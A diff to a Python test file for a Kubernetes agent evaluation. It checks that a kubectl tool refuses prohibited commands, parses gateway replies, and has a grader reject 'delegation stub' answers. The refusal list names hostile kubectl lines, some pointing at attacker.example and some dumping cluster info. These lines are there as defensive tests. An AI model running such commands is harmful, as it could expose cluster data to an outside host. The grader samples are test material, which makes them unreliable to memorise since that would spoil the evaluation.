@@ -204,10 +204,45 @@ Please review this /plan before enabling or mutating cluster infrastructure.
             "kubectl get -f https://attacker.example/s.yaml -o yaml",
             "kubectl get -k /tmp/dir",
             "kubectl cluster-info dump --output-directory=/tmp/x",
+            "kubectl cluster-info dump",
+            "kubectl -Ashttps://attacker.example get pods",
+            "kubectl get pods --profile=cpu --profile-output=/tmp/x",
         ):
             with self.subTest(cmd=cmd):
                 res = asyncio.run(tool_fn(cmd))
                 self.assertTrue("prohibited" in res or "Error:" in res, f"Expected refusal for {cmd}, got: {res}")
+
+    def test_conversation_ids_are_fresh_per_call(self):
+        """Tests that every gateway call gets its own conversation id naming the sample and epoch."""
+        from kube_agents_tasks import _conversation_id
+
+        first, second = _conversation_id(9, 1), _conversation_id(9, 1)
+        self.assertTrue(first.startswith("eval_9_1_"), first)
+        self.assertNotEqual(first, second)
+        self.assertTrue(_conversation_id(9, 2).startswith("eval_9_2_"))
+
+    def test_responses_text_joins_output_text_chunks(self):
+        """Tests that the gateway's Responses-shaped reply yields the assistant text."""
+        from kube_agents_tasks import _responses_text
+
+        reply = {
+            "output": [
+                {"type": "function_call", "name": "kubectl"},
+                {
+                    "type": "message",
+                    "role": "assistant",
+                    "content": [
+                        {"type": "output_text", "text": "3 nodes are Ready."},
+                        {"type": "output_text", "text": "kubelet v1.35."},
+                    ],
+                },
+            ]
+        }
+        self.assertEqual(_responses_text(reply), "3 nodes are Ready.\nkubelet v1.35.")
+        for bad in ({"response": "text"}, {"output": "text"}, ["output"]):
+            with self.subTest(reply=bad):
+                with self.assertRaises(RuntimeError):
+                    _responses_text(bad)
 
     def _score_with_dataset_rules(self, prompt_id, output_text):
         row = next(s for s in self.samples if s["id"] == prompt_id)
@@ -246,6 +281,47 @@ Please review this /plan before enabling or mutating cluster infrastructure.
                 passed, msg = self._score_with_dataset_rules(prompt_id, text)
                 self.assertFalse(passed, text)
                 self.assertIn("Delegation stub", msg)
+
+    def test_stub_shapes_with_preamble_markup_counts_and_bullets_rejected(self):
+        """Tests hand-offs led by a preamble or Markdown, carrying a count, or written as a bullet list."""
+        stubs = (
+            (10, "Sure, let me check the nodes in this cluster and whether each one is ready."),
+            (9, "**Checking namespaces in kubeagents-system now.**"),
+            (
+                18,
+                "Let me check the last 15 minutes of Warning events; there were 20 events overall "
+                "and I'll report back once the cluster agent replies.",
+            ),
+            (
+                11,
+                "Let me check the 10 pods running in kubeagents-system, including platform-agent-gateway, "
+                "and report back.",
+            ),
+            (
+                9,
+                "Filed with the cluster agent:\n- list every namespace in kubeagents-system\n"
+                "- report back here when done",
+            ),
+            (
+                19,
+                "I've asked the cluster agent for the last 5 lines from platform-agent-gateway:\n"
+                "- task filed\n- will report back shortly",
+            ),
+        )
+        for prompt_id, text in stubs:
+            with self.subTest(text=text):
+                passed, msg = self._score_with_dataset_rules(prompt_id, text)
+                self.assertFalse(passed, text)
+                self.assertIn("Delegation stub", msg)
+
+    def test_complete_answer_with_temporal_follow_up_passes(self):
+        """Tests that a complete answer ending with 'I'll update you when ...' is not a stub."""
+        passed, msg = self._score_with_dataset_rules(
+            14,
+            "kube-agents-web-console has 1/1 replicas ready and is available. "
+            "I'll update you when the next rollout completes.",
+        )
+        self.assertTrue(passed, msg)
 
     def test_complete_answer_with_trailing_follow_up_passes(self):
         """Tests that a complete answer ending with a follow-up offer is not treated as a stub."""
